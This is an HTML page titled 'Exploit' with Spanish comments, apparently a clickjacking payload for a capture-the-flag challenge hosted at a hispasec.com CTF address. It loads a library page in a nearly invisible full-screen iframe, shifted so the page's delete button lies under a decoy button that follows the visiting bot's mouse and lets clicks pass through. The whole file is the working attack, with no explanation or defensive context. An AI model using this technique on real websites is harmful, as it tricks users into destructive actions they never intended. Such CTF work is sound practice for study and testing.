<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        /* El iframe de la librería ocupa toda la pantalla */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1500px;
            border: none;
            z-index: 1;
            /* Ajusta este margen para que el botón de borrar 
               esté en una zona central (ej. 700px) */
            margin-top: -720px; 
            opacity: 0.0001; /* Ponlo en 0.001 para el envío final */
        }

        /* El botón que el bot busca por ID */
        #objetivo {
            position: absolute;
            width: 50px;
            height: 50px;
            z-index: 100; /* Encima de todo */
            opacity: 0.1; /* Casi invisible */
            background: red;
            border: none;
            cursor: pointer;
            /* El truco mágico: el click atraviesa este botón */
            pointer-events: none; 
        }
    </style>
</head>
<body>

    <button id="objetivo"></button>

    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>

    <script>
        const btn = document.getElementById('objetivo');
        
        // El botón seguirá el movimiento del ratón del bot.
        // Cuando el bot se posicione para clicar, el botón estará ahí.
        window.addEventListener('mousemove', (e) => {
            btn.style.left = e.pageX - 25 + 'px';
            btn.style.top = e.pageY - 25 + 'px';
        });

        // Si el bot no mueve el ratón y clica por coordenadas fijas,
        // lo posicionamos también en un punto estático probable.
        btn.style.left = '50%';
        btn.style.top = '100px'; 
    </script>
</body>
</html>
